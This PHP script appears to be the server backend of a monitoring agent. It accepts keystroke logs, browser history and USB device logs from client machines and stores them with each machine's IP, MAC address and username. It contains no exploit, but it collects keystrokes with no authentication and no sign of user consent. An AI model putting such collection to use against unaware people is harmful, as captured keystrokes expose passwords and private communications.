<?php
/**
 * Event Handler v2.0 - Database-Based Storage
 * Handles incoming client events and stores them in database instead of files
 * Uses DatabaseService class for all database operations
 */

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Include configuration and database service
require_once 'config.inc.php';
require_once 'services/DatabaseService.php';

// Set content type to JSON
header('Content-Type: application/json');

$config = new JConfig();

// Initialize database connection
$mysqli = new mysqli($config->dbhost, $config->dbuser, $config->dbpassword, $config->dbname);

if ($mysqli->connect_error) {
    error_log("Database connection failed: " . $mysqli->connect_error);
    http_response_code(500);
    echo json_encode(['error' => 'Database connection failed']);
    exit;
}

// Initialize database service
$dbService = new DatabaseService($mysqli);

// Get JSON input
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data) {
    error_log("Invalid JSON input received");
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON input']);
    exit;
}

// Extract common data
$appEvent = $data['Event'] ?? '';
$version = $data['Version'] ?? '';
$macAddress = $data['MacAddress'] ?? '';
$username = $data['Username'] ?? '';

// Get client IP address
$clientIP = $_SERVER['REMOTE_ADDR'] ?? '';

// Create or update monitor IP record
$dbService->createOrUpdateMonitorIP($clientIP, $macAddress, $username, $version);

// Handle different event types
$response = ['status' => 'success', 'message' => 'Event processed successfully'];

try {
    
    // Update monitor activity timestamp
    $dbService->updateMonitorActivity($clientIP, 'monitor');
    
    switch ($appEvent) {
        case 'Tic':
            $response['data'] = ['interval' => 30]; // Return interval for next tic
            break;
            
        case 'BrowserHistory':
            $browserHistories = $data['BrowserHistories'] ?? [];
            if (!empty($browserHistories)) {
                $inserted_count = $dbService->addBrowserHistoryLogs($browserHistories, $clientIP, $macAddress);
                $dbService->updateMonitorActivity($clientIP, 'browser');
                $response['data'] = [
                    'inserted_count' => $inserted_count,
                    'interval' => 120 // Return interval for next browser history sync
                ];
            }
            break;
            
        case 'KeyLog':
            $keyLogs = $data['KeyLogs'] ?? [];
            if (!empty($keyLogs)) {
                $inserted_count = $dbService->addKeyLogs($keyLogs, $clientIP, $macAddress);
                $response['data'] = [
                    'inserted_count' => $inserted_count,
                    'interval' => 60 // Return interval for next key log sync
                ];
            }
            break;
            
        case 'USBLog':
            $usbLogs = $data['USBLogs'] ?? [];
            if (!empty($usbLogs)) {
                $inserted_count = $dbService->addUSBDeviceLogs($usbLogs, $clientIP, $macAddress);
                $response['data'] = [
                    'inserted_count' => $inserted_count,
                    'interval' => 30 // Return interval for next USB log sync
                ];
            }
            break;
            
        default:
            error_log("Unknown event type: $appEvent");
            http_response_code(400);
            echo json_encode(['error' => 'Unknown event type']);
            exit;
    }
    
} catch (Exception $e) {
    error_log("Error processing event $appEvent: " . $e->getMessage());
    http_response_code(500);
    echo json_encode(['error' => 'Internal server error']);
    exit;
}

// Close database connection
$mysqli->close();

// Return success response
echo json_encode($response);
?> 